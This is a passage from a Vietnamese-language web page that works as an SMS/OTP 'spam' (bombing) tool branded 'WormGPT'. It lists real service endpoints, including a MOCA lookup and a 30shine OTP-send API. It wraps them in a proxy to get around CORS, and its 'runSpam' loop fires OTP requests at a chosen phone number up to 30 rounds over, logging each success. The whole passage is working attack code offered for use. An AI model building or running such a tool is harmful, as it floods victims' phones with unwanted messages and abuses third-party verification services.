                { name: 'MOCA', url: 'https://moca.vn/moca/v2/users/role?phoneNumber=', method: 'GET', headers: { 'User-Agent': 'Pass/2.10.156' }, buildUrl: (p) => 'https://moca.vn/moca/v2/users/role?phoneNumber=' + encodeURIComponent(p) },

                { name: '30shine', url: 'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p }) },

            // Nếu proxy = DIRECT thì dùng url gốc, còn không thì thêm proxy
            return rawApis.map(api => {
                const newApi = { ...api };
                if (proxy !== 'DIRECT') {
                    if (api.buildUrl) {
                        // GET: build url rồi thêm proxy
                        const origBuild = api.buildUrl;
                        newApi.buildUrl = (p) => proxy + encodeURIComponent(origBuild(p));
                    } else {
                        newApi.url = proxy + encodeURIComponent(api.url);
                    }
                }
                return newApi;
            });
        }

        // ===== LOG & UI =====
        const statusBox = document.getElementById('statusBox');
        const logCount = document.getElementById('logCount');
        let logCounter = 0;
        let running = false;
        let stopRequested = false;

        function addLog(msg, type = 'info') {
            const time = new Date().toLocaleTimeString('vi-VN');
            const div = document.createElement('div');
            div.className = 'log-item';
            let cls = 'info';
            if (type === 'success') cls = 'success';
            else if (type === 'fail') cls = 'fail';
            else if (type === 'warning') cls = 'warning';
            div.innerHTML = `<span class="time">[${time}]</span><span class="msg ${cls}">${msg}</span>`;
            statusBox.appendChild(div);
            statusBox.scrollTop = statusBox.scrollHeight;
            logCounter++;
            logCount.textContent = logCounter;
            while (statusBox.children.length > 300) {
                statusBox.removeChild(statusBox.firstChild);
                logCounter--;
            }
        }

        // ===== HÀM SPAM CHÍNH =====
        async function runSpam(phone, count) {
            if (running) { addLog('⚠️ Đang chạy, vui lòng đợi', 'warning'); return; }
            if (!phone || phone.length < 9) { addLog('❌ Số điện thoại không hợp lệ', 'fail'); return; }
            let total = parseInt(count) || 1;
            if (total < 1) total = 1;
            if (total > 30) total = 30;

            // Xây dựng danh sách API với proxy hiện tại
            const apis = buildApiList(currentProxy);
            const serviceNames = apis.map(a => a.name);

            running = true;
            stopRequested = false;
            addLog(`🚀 Bắt đầu spam ${total} lượt cho ${phone} (${apis.length} API)`, 'info');
            addLog(`🔗 Proxy: ${currentProxy === 'DIRECT' ? 'Không dùng proxy' : currentProxy}`, 'info');

            let successCount = 0, failCount = 0;

            for (let i = 0; i < total; i++) {
                if (stopRequested) break;
                addLog(`--- Lượt ${i+1}/${total} ---`, 'info');
                for (let j = 0; j < apis.length; j++) {
                    if (stopRequested) break;
                    const api = apis[j];
                    try {
                        let url = api.url;
                        let body = null;
                        const headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', ...api.headers };

                        if (api.buildUrl) {
                            url = api.buildUrl(phone);
                        } else if (api.body) {
                            body = typeof api.body === 'function' ? api.body(phone) : api.body;
                        }

                        const response = await fetch(url, { 
                            method: api.method, 
                            headers: headers, 
                            body: body,
                            // Thêm mode no-cors để tránh lỗi CORS nếu proxy không hoạt động
                            mode: 'cors'
                        });
                        const text = await response.text();
                        const isSuccess = text.includes('success') || text.includes('otp') || text.includes('OK') || 
                                         text.includes('"code":0') || text.includes('"status":0') || 
                                         text.includes('otpTrackingId') || text.includes('"success":true') ||
                                         text.includes('200') || text.includes('OK');
                        if (isSuccess) { 
                            successCount++; 
                            addLog(`✅ ${api.name} -> Thành công`, 'success'); 
                        } else { 
                            failCount++; 
                            addLog(`❌ ${api.name} -> Thất bại`, 'fail'); 
                        }
                    } catch(e) {
                        failCount++;
                        addLog(`⚠️ ${api.name} -> Lỗi: ${e.message || 'unknown'}`, 'fail');
                    }
                    await new Promise(r => setTimeout(r, 30));
                }
                if (i < total - 1 && !stopRequested) {
                    addLog(`⏳ Chờ 500ms...`, 'info');
                    await new Promise(r => setTimeout(r, 500));
                }
            }

            running = false;
            const totalReq = successCount + failCount;
            addLog(`🏁 Hoàn thành! ✅ ${successCount} / ❌ ${failCount} (Tổng ${totalReq})`, successCount > failCount ? 'success' : 'fail');
        }

        // ===== SỰ KIỆN =====
        const phoneInput = document.getElementById('phoneInput');
        const countInput = document.getElementById('countInput');
        const startBtn = document.getElementById('startBtn');
        const clearBtn = document.getElementById('clearBtn');
        const stopBtn = document.getElementById('stopBtn');

        startBtn.addEventListener('click', function() {
            runSpam(phoneInput.value.trim(), countInput.value);
        });

        clearBtn.addEventListener('click', function() {
            statusBox.innerHTML = '';
            logCounter = 0;
            logCount.textContent = '0';
            addLog('🗑️ Đã xóa log', 'info');
        });

        stopBtn.addEventListener('click', function() {
            stopRequested = true;
            running = false;
            addLog('⏹️ Dừng theo yêu cầu', 'warning');
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                runSpam(phoneInput.value.trim(), countInput.value);
            }
        });

        // ===== NHẠC =====
        const audio = document.getElementById('bgMusic');
        const playBtn = document.getElementById('playBtn');
        let isPlaying = false;

        document.addEventListener('click', function initAudio() {
            if (!isPlaying) {
                audio.play().catch(() => {});
                isPlaying = true;
                playBtn.innerHTML = '<i class="fas fa-pause"></i>';
            }
            document.removeEventListener('click', initAudio);
        }, { once: true });

        playBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            if (isPlaying) {
                audio.pause();
                isPlaying = false;
                playBtn.innerHTML = '<i class="fas fa-play"></i>';
            } else {
                audio.play().catch(() => {});
                isPlaying = true;
                playBtn.innerHTML = '<i class="fas fa-pause"></i>';
            }
        });

        // ===== KHỞI TẠO =====
        document.getElementById('apiCountDisplay').textContent = buildApiList(currentProxy).length + ' API';
        addLog('🔥 WormGPT sẵn sàng, chờ lệnh...', 'info');
        addLog('💡 Chọn proxy khác nếu gặp lỗi CORS', 'info');
    </script>
</body>
</html>
